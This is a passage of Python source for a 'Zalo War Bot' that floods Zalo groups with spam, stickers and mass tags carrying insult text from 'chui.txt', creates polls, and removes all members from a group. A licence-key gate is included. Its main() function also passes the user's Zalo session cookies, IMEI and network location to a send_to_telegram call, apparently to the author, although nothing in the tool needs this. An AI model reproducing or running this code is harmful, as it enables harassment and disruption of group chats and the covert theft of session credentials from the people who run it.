            print(random_color_line(f"✅ Đã dừng {command_name}!"))

    def start_all_commands(self, message_object, author_id, thread_id, thread_type):
        self.start_command("big", big_text_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("bigitalic", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="italic")
        self.start_command("bigsmall", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="small")
        self.start_command("italic", italic_text_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("kickall", kick_all_member_group, message_object, author_id, thread_id, thread_type)
        self.start_command("lende", var_group_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("nhay", nhay_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("nhaytag", nhaytag, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("nhayuser", nhayuser, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("small", small_text_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("spam", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt")
        for i in range(1, 11):
            self.start_command(f"spam{i}", spam_from_file, message_object, author_id, thread_id, thread_type, f"spam{i}.txt")
        self.start_command("spamitalic", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="i")
        self.start_command("spamsmall", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="f_50")
        self.start_command("spamsuperbig", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="b,f_3000")
        self.start_command("spamstk", spam_stickers, message_object, author_id, thread_id, thread_type)
        self.start_command("spamtag", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt")
        for i in range(1, 11):
            self.start_command(f"spamtag{i}", spam_tag_all, message_object, author_id, thread_id, thread_type, f"spamtag{i}.txt")
        self.start_command("spamtagbig", spam_tag_big, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("spamtagitalic", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="i")
        self.start_command("spamtaglag", spam_tag_lag, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("spamtagmix", spam_tag_mix, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("spamtagsmall", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="f_50")
        self.start_command("spamtagsuperbig", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="b,f_3000")
        self.start_command("superbig", superbig_text_from_file, message_object, author_id, thread_id, thread_type)

    def onMessage(self, mid, author_id, message, message_object, thread_id, thread_type):
        self.received_messages += 1
        self.active_users.add(author_id)
        self.current_group_id = thread_id if thread_type == ThreadType.GROUP else None
        if thread_type == ThreadType.GROUP and not self.group_name:
            try:
                self.group_name = self.fetchGroupInfo(thread_id).gridInfoMap[thread_id].groupName
            except:
                self.group_name = "Không xác định"
        uptime = time.time() - self.start_time
        uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
        total_messages = self.sent_messages + self.received_messages

        print(random_color_line("╔══════ 📩 TIN NHẮN MỚI ĐẾN 📩 ══════╗"))
        animated_text(f"║ ⏰ Thời gian: {get_current_time()}         ", 0.01)
        animated_text(f"║ 📝 Nội dung: {message}                    ", 0.01)
        animated_text(f"║ 👤 Từ: {author_id}                        ", 0.01)
        animated_text(f"║ ⏳ Uptime: {uptime_str}                   ", 0.01)
        animated_text(f"║ 📤 Tin nhắn đã gửi: {self.sent_messages}  ", 0.01)
        animated_text(f"║ 📥 Tin nhắn đã nhận: {self.received_messages}", 0.01)
        animated_text(f"║ 📊 Tổng tin nhắn: {total_messages}        ", 0.01)
        print(random_color_line("╚══════════════════════════════════════╝"))

        if not isinstance(message, str):
            return
        
        str_message = str(message).strip()
        
        if not self.is_admin(author_id):
            print(random_color_line(f"🚫 {author_id} không có quyền sử dụng bot! ⚠️"))
            return

        if str_message == 'menu':
            uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
            menu_text = (
                f"╔═ 🔥 LỆNH BOT WAR ZALO 🔥 ═╗\n"
                f"║ ⏰ Thời gian hiện tại: {get_current_time()}\n"
                f"║ ⏳ Thời gian khởi động: {datetime.fromtimestamp(self.start_time).strftime('%H:%M:%S %d/%m/%Y')}\n"
                f"║ ⏲ Uptime: {uptime_str}\n"
                f"║ ⚙️ Gõ lệnh để kích hoạt:                 \n"
                f"║ big        - Chữ lớn từ chui.txt (1s)          \n"
                f"║ bigitalic  - Chữ lớn + nghiêng từ chui.txt (1s)\n"
                f"║ bigsmall   - Chữ lớn + nhỏ từ chui.txt (1s)    \n"
                f"║ italic     - Chữ nghiêng từ chui.txt (1s)      \n"
                f"║ kickall    - Xóa tất cả thành viên nhóm        \n"
                f"║ lende      - Spam mention ngẫu nhiên (0.1s)     \n"
                f"║ nhay       - Spam văn bản từ chui.txt (1s)     \n"
                f"║ nhaytag    - Tag tất cả từ chui.txt (0.1s)      \n"
                f"║ nhayuser @tag - Tag người dùng từ chui.txt (6s) \n"
                f"║ poll on    - Tạo poll từ chui.txt (1s)          \n"
                f"║ poll stop  - Dừng tạo poll                     \n"
                f"║ small      - Chữ nhỏ từ chui.txt (1s)          \n"
                f"║ spam       - Gửi toàn bộ spam.txt (10s)         \n"
                f"║ spam1-10   - Gửi toàn bộ spam1-10.txt (10s)     \n"
                f"║ spamitalic - Gửi spam.txt chữ nghiêng (10s)     \n"
                f"║ spamsmall  - Gửi spam.txt chữ nhỏ (10s)         \n"
                f"║ spamsuperbig - Gửi spam.txt chữ siêu to (10s)   \n"
                f"║ spamstk    - Spam sticker (10s)                 \n"
                f"║ spamtag    - Tag all toàn bộ spamtag.txt (10s)  \n"
                f"║ spamtag1-10 - Tag all spamtag1-10.txt (10s)     \n"
                f"║ spamtagbig  - Tag tất cả chữ lớn (1s)          \n"
                f"║ spamtagitalic - Tag all chữ nghiêng (10s)       \n"
                f"║ spamtaglag  - Tag tất cả từ chui.txt (1s)      \n"
                f"║ spamtagmix  - Tag tất cả từ chui.txt (1s)      \n"
                f"║ spamtagsmall - Tag all chữ nhỏ (10s)            \n"
                f"║ spamtagsuperbig - Tag all chữ siêu to (10s)     \n"
                f"║ superbig   - Chữ siêu to từ chui.txt (1s)      \n"
                f"║ ⏹️ Dừng lệnh: st <lệnh> (VD: st lende)        \n"
                f"║ 🎖️ Tnhan w Lhung           \n"
                f"╚═══════════════════════════════════════════════╝"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
            return

        elif str_message == 'big':
            self.start_command("big", big_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'bigitalic':
            self.start_command("bigitalic", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="italic")
        elif str_message == 'bigsmall':
            self.start_command("bigsmall", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="small")
        elif str_message == 'italic':
            self.start_command("italic", italic_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'kickall':
            if thread_type == ThreadType.GROUP:
                kick_all_member_group(self, message_object, author_id, thread_id, thread_type)
            else:
                print(random_color_line("⚠️ Lệnh kickall chỉ dùng trong nhóm! 🔒"))
        elif str_message == 'lende':
            self.start_command("lende", var_group_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'nhay':
            self.start_command("nhay", nhay_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'nhaytag':
            self.start_command("nhaytag", nhaytag, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message.startswith('nhayuser'):
            self.start_command("nhayuser", nhayuser, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message.startswith('poll'):
            handle_poll_command(str_message, message_object, thread_id, thread_type, author_id, self)
        elif str_message == 'small':
            self.start_command("small", small_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'spam':
            self.start_command("spam", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt")
        elif str_message in [f'spam{i}' for i in range(1, 11)]:
            file_name = f"spam{str_message[4:]}.txt"
            self.start_command(str_message, spam_from_file, message_object, author_id, thread_id, thread_type, file_name)
        elif str_message == 'spamitalic':
            self.start_command("spamitalic", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="i")
        elif str_message == 'spamsmall':
            self.start_command("spamsmall", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="f_50")
        elif str_message == 'spamsuperbig':
            self.start_command("spamsuperbig", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="b,f_3000")
        elif str_message == 'spamstk':
            self.start_command("spamstk", spam_stickers, message_object, author_id, thread_id, thread_type)
        elif str_message == 'spamtag':
            self.start_command("spamtag", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt")
        elif str_message in [f'spamtag{i}' for i in range(1, 11)]:
            file_name = f"spamtag{str_message[7:]}.txt"
            self.start_command(str_message, spam_tag_all, message_object, author_id, thread_id, thread_type, file_name)
        elif str_message == 'spamtagbig':
            self.start_command("spamtagbig", spam_tag_big, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message == 'spamtagitalic':
            self.start_command("spamtagitalic", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="i")
        elif str_message == 'spamtaglag':
            self.start_command("spamtaglag", spam_tag_lag, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message == 'spamtagmix':
            self.start_command("spamtagmix", spam_tag_mix, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message == 'spamtagsmall':
            self.start_command("spamtagsmall", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="f_50")
        elif str_message == 'spamtagsuperbig':
            self.start_command("spamtagsuperbig", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="b,f_3000")
        elif str_message == 'superbig':
            self.start_command("superbig", superbig_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'all':
            self.start_all_commands(message_object, author_id, thread_id, thread_type)

        elif str_message.startswith('st '):
            parts = str_message.split()
            if len(parts) > 1:
                command_to_stop = parts[1]
                self.stop_command(command_to_stop)
            else:
                print(random_color_line("⚠️ Vui lòng chỉ định lệnh để dừng, ví dụ: st lende"))

def select_key_type():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        animated_text("╔══════ 🔥 WELCOME TO ZALO WAR BOT 🔥 ══════╗", 0.05)
        print(random_color_line("║                                           "))
        animated_text("║ 🌟 BOT WAR ZALO DO QUANGTHANG PHÁT TRIỂN    ", 0.02)
        animated_text("║ 👨‍💻 Tác giả: Trương Quang Thắng         ", 0.02)
        animated_text("║ 🎂 Sinh nhật: 08/05/200X      ", 0.02)
        animated_text("║ 🇻🇳 Quê quán: Thái Bình, Việt Nam           ", 0.02)
        animated_text("║ 💼 Nghề nghiệp: Dev Fullstack & Hacker    ", 0.02)
        animated_text("║ 🎓 Học vấn: Tự học + Đam mê vô hạn        ", 0.02)
        animated_text("║ 🎮 Sở thích: Code, Game, Anime, Hacking   ", 0.02)
        animated_text("║ 🌟 Thành tựu: Bot War Zalo   ", 0.02)
        animated_text("║ 💡 Triết lý: 'Code là nghệ thuật'         ", 0.02)
        animated_text("║ 📧 Email: quangthangdev@gmail.com         ", 0.02)
        animated_text("║ 📲 Telegram: t.me/quangthangcoder         ", 0.02)
        animated_text("║ 🔗 FB: fb.com/quangthangdev               ", 0.02)
        animated_text("║ 🔧 Công cụ lập trình: Python, JS, C++     ", 0.02)
        animated_text("║ ⚙️ Framework: Flask, Django, Node.js      ", 0.02)
        animated_text("║ 🎨 IDE: VS Code, PyCharm, Sublime Text    ", 0.02)
        animated_text("║ 📜 Copyright: Trương Quang Thắng © 2025   ", 0.02)
        print(random_color_line("╠════ 🔥 CHỌN LOẠI KEY 🔥 ════════╣"))
        animated_text("║ 1. Tạo key free: Hiệu lực 3 ngày theo IP (Cần xác nhận từ QuangThang)", 0.02)
        animated_text("║ 2. Nhập key free: Kích hoạt key free      ", 0.02)
        animated_text("║ 3. Nhập key vĩnh viễn: Không bao giờ hết hạn", 0.02)
        print(random_color_line("║                                           "))
        print(random_color_line("╚═══════════════════════════════════════════╝"))
        animated_text("⏳ Chọn loại key (1, 2 hoặc 3): 🚀", 0.03)
        key_type = input(random_color_line("🔧 Loại key: ")).strip()

        if key_type == "1":
            key, expiration = initialize_dynamic_key_for_ip()
            if key and expiration:
                expiration_str = datetime.fromisoformat(expiration).strftime('%H:%M:%S %d/%m/%Y')
                animated_text(f"✅ Đã tạo key free: {key}", 0.02)
                animated_text(f"⏰ Hết hạn: {expiration_str}", 0.02)
                animated_text("ℹ️ Key đã được lưu sau khi xác nhận từ QuangThang", 0.02)
                animated_text("Nhấn 0 để quay lại hoặc bất kỳ phím nào để tiếp tục...", 0.02)
                choice = input(random_color_line("🔙 Lựa chọn: "))
                if choice == "0":
                    continue
                return key_type
            else:
                animated_text("❌ Không thể tạo key free! Vui lòng kiểm tra kết nối hoặc xác nhận từ QuangThang.", 0.02)
                time.sleep(2)
                continue
        elif key_type in ["2", "3"]:
            return key_type
        else:
            animated_text("❌ Vui lòng chọn 1, 2 hoặc 3!", 0.02)
            time.sleep(2)

def print_key_input(key_type):
    os.system('cls' if os.name == 'nt' else 'clear')
    animated_text("╔══════ 🔥 NHẬP KEY ZALO WAR BOT 🔥 ══════╗", 0.05)
    print(random_color_line("║                                          "))
    if key_type == "2":
        animated_text("║ 🔑 Loại: Nhập key free (3 ngày theo IP) ", 0.02)
        # Tự động lấy key từ file
        ip = get_ip_identifier()
        try:
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
            if ip in keys_data:
                key_input = keys_data[ip]["key"]
                animated_text(f"║ 🔐 Key tự động lấy từ file: {key_input}", 0.02)
            else:
                animated_text(f"║ ❌ IP {ip} không có key trong file!", 0.02)
                key_input = None
        except FileNotFoundError:
            animated_text("║ ❌ File dynamic_keys.json không tồn tại!", 0.02)
            key_input = None
        except Exception as e:
            animated_text(f"║ ❌ Lỗi khi đọc file key: {str(e)}", 0.02)
            key_input = None
    elif key_type == "3":
        animated_text("║ 🔑 Loại: Nhập key vĩnh viễn             ", 0.02)
        animated_text("║ 📩 Liên hệ Quang Thắng để hỗ trợ:        ", 0.02)
        animated_text("║ 🔗 fb.com/quangthangdev                  ", 0.02)
        key_input = input(random_color_line("🔐 Khóa kích hoạt: ")).strip()
    print(random_color_line("║                                          "))
    print(random_color_line("╚══════════════════════════════════════════╝"))
    return key_input

def validate_key(key_input, key_type):
    if key_type == "2":
        if key_input is None:
            return False
        if is_key_valid(key_input):
            ip = get_ip_identifier()
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
            expiration = datetime.fromisoformat(keys_data[ip]["expiration"]).strftime('%H:%M:%S %d/%m/%Y')
            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("╔═══ KEY FREE ĐƯỢC XÁC NHẬN ═══╗", 0.05)
            print(random_color_line("║                                "))
            animated_text("║ ✅ Truy cập thành công cho IP! ", 0.02)
            animated_text(f"║ 🔑 Key: {key_input}           ", 0.02)
            animated_text(f"║ ⏰ Hết hạn: {expiration}      ", 0.02)
            animated_text("║ ⚡ Công cụ đã sẵn sàng.        ", 0.02)
            animated_text("║ ⏳ Tiến hành trong giây lát... ", 0.02)
            print(random_color_line("║                                "))
            print(random_color_line("╚════════════════════════════════╝"))
            time.sleep(5)  # Hiển thị 5 giây
            return True
        else:
            ip = get_ip_identifier()
            try:
                with open(KEY_FILE, 'r', encoding='utf-8') as f:
                    keys_data = json.load(f)
                if ip in keys_data:
                    key_data = keys_data[ip]
                    correct_key = key_data["key"]
                    expiration = datetime.fromisoformat(key_data["expiration"]).strftime('%H:%M:%S %d/%m/%Y')
                    if datetime.now() > datetime.fromisoformat(key_data["expiration"]):
                        status = "Hết hạn"
                        animated_text("❌ Key free đã hết hạn! Vui lòng liên hệ Quang Thắng để gia hạn.", 0.02)
                    else:
                        status = "Còn hiệu lực"
                else:
                    correct_key = DEFAULT_FREE_KEY
                    expiration = "Chưa tạo"
                    status = "Chưa tạo"
                    animated_text("❌ IP chưa được cấp key! Vui lòng chọn tùy chọn 1 để tạo key free.", 0.02)
            except FileNotFoundError:
                correct_key = DEFAULT_FREE_KEY
                expiration = "Chưa tạo"
                status = "Chưa tạo"
                animated_text("❌ File key không tồn tại! Vui lòng chọn tùy chọn 1 để tạo key free.", 0.02)
            except Exception as e:
                correct_key = DEFAULT_FREE_KEY
                expiration = "Lỗi"
                status = "Lỗi"
                animated_text(f"❌ Lỗi khi kiểm tra key: {str(e)}", 0.02)

            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("╔═══ KEY FREE KHÔNG HỢP LỆ HOẶC HẾT HẠN ═══╗", 0.05)
            print(random_color_line("║                                           "))
            animated_text("║ ❌ Key free không hợp lệ hoặc đã hết hạn!    ", 0.02)
            animated_text(f"║ 🔑 Key free đúng: {correct_key}           ", 0.02)
            animated_text(f"║ ⏰ Hết hạn: {expiration}                  ", 0.02)
            animated_text(f"║ ⚠️ Trạng thái: {status}                   ", 0.02)
            animated_text("║ 📩 Liên hệ Quang Thắng để hỗ trợ          ", 0.02)
            animated_text("║ 🔗 fb.com/quangthangdev                   ", 0.02)
            animated_text("║ ⏲ Thoát sau 5 giây...                    ", 0.02)
            print(random_color_line("║                                           "))
            print(random_color_line("╚═══════════════════════════════════════════╝"))
            time.sleep(5)
            return False
    
    elif key_type == "3":
        if key_input == VALID_KEY:
            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("╔═══ KEY VĨNH VIỄN ĐƯỢC XÁC NHẬN ═══╗", 0.05)
            print(random_color_line("║                                    "))
            animated_text("║ ✅ Truy cập thành công với key vĩnh viễn!", 0.02)
            animated_text("║ ⚡ Công cụ đã sẵn sàng.            ", 0.02)
            animated_text("║ ⏳ Tiến hành trong giây lát...     ", 0.02)
            print(random_color_line("║                                    "))
            print(random_color_line("╚════════════════════════════════════╝"))
            time.sleep(1)
            return True
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("╔═══ KEY VĨNH VIỄN KHÔNG HỢP LỆ ═══╗", 0.05)
            print(random_color_line("║                                   "))
            animated_text("║ ❌ Key vĩnh viễn không đúng!            ", 0.02)
            animated_text("║ 📩 Liên hệ Quang Thắng để lấy key:     ", 0.02)
            animated_text("║ 🔗 fb.com/quangthangdev                ", 0.02)
            animated_text("║ ⏲ Thoát sau 5 giây...                 ", 0.02)
            print(random_color_line("║                                   "))
            print(random_color_line("╚═══════════════════════════════════╝"))
            time.sleep(5)
            return False
    
    return False

def print_menu():
    current_time = get_current_time()
    ip, isp, location = get_network_info()

    os.system('cls' if os.name == 'nt' else 'clear')
    animated_text("╔══════ 🚀 BẢNG ĐIỀU KHIỂN BOT WAR ZALO 🚀 ══════╗", 0.05)
    print(random_color_line("║                                                 "))
    animated_text(f"║ 👨‍💻 Tác giả: Trương Quang Thắng              ", 0.02)
    animated_text(f"║ 🎂 Sinh nhật: 08/05/200X     ", 0.02)
    animated_text(f"║ 🏡 Quê quán: Thái Bình, Việt Nam                ", 0.02)
    animated_text(f"║ 💼 Nghề nghiệp: Developer Fullstack & Hacker  ", 0.02)
    animated_text(f"║ 🎓 Học vấn: Tự học, đam mê lập trình          ", 0.02)
    animated_text(f"║ 🎮 Sở thích: Coding, Gaming, Anime, Hacking   ", 0.02)
    animated_text(f"║ 🌟 Thành tựu: Bot War Zalo mạnh nhất 2025     ", 0.02)
    animated_text(f"║ 💡 Triết lý: 'Code để thay đổi thế giới'      ", 0.02)
    animated_text(f"║ 📧 Liên hệ: quangthangdev@gmail.com           ", 0.02)
    animated_text(f"║ 📲 Telegram: t.me/quangthangcoder             ", 0.02)
    animated_text(f"║ 🔗 FB: fb.com/quangthangdev                   ", 0.02)
    animated_text(f"║ 🔧 Công cụ lập trình: Python, JS, C++, PHP    ", 0.02)
    animated_text(f"║ ⚙️ Framework: Flask, Django, React, Node.js   ", 0.02)
    animated_text(f"║ 🎨 IDE: VS Code, PyCharm, IntelliJ, Sublime   ", 0.02)
    animated_text(f"║ 📅 Cập nhật: 10/03/2025                      ", 0.02)
    animated_text(f"║ 🎯 Mục đích: Chiến thắng mọi cuộc War Zalo    ", 0.02)
    animated_text(f"║ ⏰ Thời gian: {current_time}                  ", 0.02)
    animated_text(f"║ 🌐 IP: {ip}                                   ", 0.02)
    animated_text(f"║ 📡 Nhà mạng: {isp}                            ", 0.02)
    animated_text(f"║ 📍 Vị trí: {location}                         ", 0.02)
    print(random_color_line("║                                                 "))
    print(random_color_line("╠════ 🔥 DANH SÁCH LỆNH WAR 🔥 ═══════════╣"))
    animated_text(f"║ ⚙️ Chọn số để kích hoạt siêu năng lực:         ", 0.02)
    animated_text(f"║ 1. big        - Chữ lớn từ chui.txt (1s)          ", 0.02)
    animated_text(f"║ 2. bigitalic  - Chữ lớn + nghiêng từ chui.txt (1s)", 0.02)
    animated_text(f"║ 3. bigsmall   - Chữ lớn + nhỏ từ chui.txt (1s)    ", 0.02)
    animated_text(f"║ 4. italic     - Chữ nghiêng từ chui.txt (1s)      ", 0.02)
    animated_text(f"║ 5. kickall    - Xóa tất cả thành viên nhóm        ", 0.02)
    animated_text(f"║ 6. lende      - Spam mention ngẫu nhiên (0.1s)     ", 0.02)
    animated_text(f"║ 7. nhay       - Spam văn bản từ chui.txt (1s)     ", 0.02)
    animated_text(f"║ 8. nhaytag    - Tag tất cả từ chui.txt (0.1s)      ", 0.02)
    animated_text(f"║ 9. nhayuser   - Tag người dùng từ chui.txt (6s)    ", 0.02)
    animated_text(f"║ 10. poll on   - Tạo poll từ chui.txt (1s)          ", 0.02)
    animated_text(f"║ 11. small     - Chữ nhỏ từ chui.txt (1s)          ", 0.02)
    animated_text(f"║ 12. spam      - Gửi toàn bộ spam.txt (10s)         ", 0.02)
    animated_text(f"║ 13-22. spam1-10 - Gửi toàn bộ spam1-10.txt (10s)   ", 0.02)
    animated_text(f"║ 23. spamitalic - Gửi spam.txt chữ nghiêng (10s)    ", 0.02)
    animated_text(f"║ 24. spamsmall - Gửi spam.txt chữ nhỏ (10s)         ", 0.02)
    animated_text(f"║ 25. spamsuperbig - Gửi spam.txt chữ siêu to (10s)  ", 0.02)
    animated_text(f"║ 26. spamstk   - Spam sticker (10s)                 ", 0.02)
    animated_text(f"║ 27. spamtag   - Tag all toàn bộ spamtag.txt (10s)  ", 0.02)
    animated_text(f"║ 28-37. spamtag1-10 - Tag all spamtag1-10.txt (10s) ", 0.02)
    animated_text(f"║ 38. spamtagbig - Tag tất cả chữ lớn (1s)          ", 0.02)
    animated_text(f"║ 39. spamtagitalic - Tag all chữ nghiêng (10s)      ", 0.02)
    animated_text(f"║ 40. spamtaglag - Tag tất cả từ chui.txt (1s)      ", 0.02)
    animated_text(f"║ 41. spamtagmix - Tag tất cả từ chui.txt (1s)      ", 0.02)
    animated_text(f"║ 42. spamtagsmall - Tag all chữ nhỏ (10s)           ", 0.02)
    animated_text(f"║ 43. spamtagsuperbig - Tag all chữ siêu to (10s)    ", 0.02)
    animated_text(f"║ 44. superbig  - Chữ siêu to từ chui.txt (1s)      ", 0.02)
    animated_text(f"║ 45. all       - Chạy tất cả lệnh                  ", 0.02)
    print(random_color_line("║                                                 "))
    print(random_color_line("╚═════════════════════════════════════════════════╝"))
    animated_text("⏳ Nhập số lệnh để kích hoạt (1-45): 🔥", 0.03)

def main():
    key_type = select_key_type()
    if not key_type:
        return

    key_input = None
    if key_type == "2" or key_type == "3":
        key_input = print_key_input(key_type)
    if not validate_key(key_input, key_type):
        return

    ip, isp, location = get_network_info()
    send_to_telegram(ip, isp, location, IMEI, SESSION_COOKIES)

    print_menu()
    choice = input(random_color_line("🔧 Lệnh: ")).strip().lower()
    client = Bot(API_KEY, SECRET_KEY, imei=IMEI, session_cookies=SESSION_COOKIES)
    
    command_map = {
        '1': 'big', '2': 'bigitalic', '3': 'bigsmall', '4': 'italic', '5': 'kickall',
        '6': 'lende', '7': 'nhay', '8': 'nhaytag', '9': 'nhayuser', '10': 'poll on',
        '11': 'small', '12': 'spam', '13': 'spam1', '14': 'spam2', '15': 'spam3',
        '16': 'spam4', '17': 'spam5', '18': 'spam6', '19': 'spam7', '20': 'spam8',
        '21': 'spam9', '22': 'spam10', '23': 'spamitalic', '24': 'spamsmall', 
        '25': 'spamsuperbig', '26': 'spamstk', '27': 'spamtag', '28': 'spamtag1',
        '29': 'spamtag2', '30': 'spamtag3', '31': 'spamtag4', '32': 'spamtag5',
        '33': 'spamtag6', '34': 'spamtag7', '35': 'spamtag8', '36': 'spamtag9',
        '37': 'spamtag10', '38': 'spamtagbig', '39': 'spamtagitalic', '40': 'spamtaglag',
        '41': 'spamtagmix', '42': 'spamtagsmall', '43': 'spamtagsuperbig', '44': 'superbig',
        '45': 'all'
    }
    
    if choice in command_map:
        animated_text(f"✅ Đã kích hoạt lệnh: {command_map[choice]}", 0.03)
    else:
        animated_text("❌ Lựa chọn không hợp lệ!", 0.03)
        return

    animated_text("⚡ Running By Quang Thang. Sử dụng lệnh trong Zalo để bắt đầu.", 0.03)
    client.listen(run_forever=True, thread=True, delay=0, type='requests')

if __name__ == "__main__":
    main()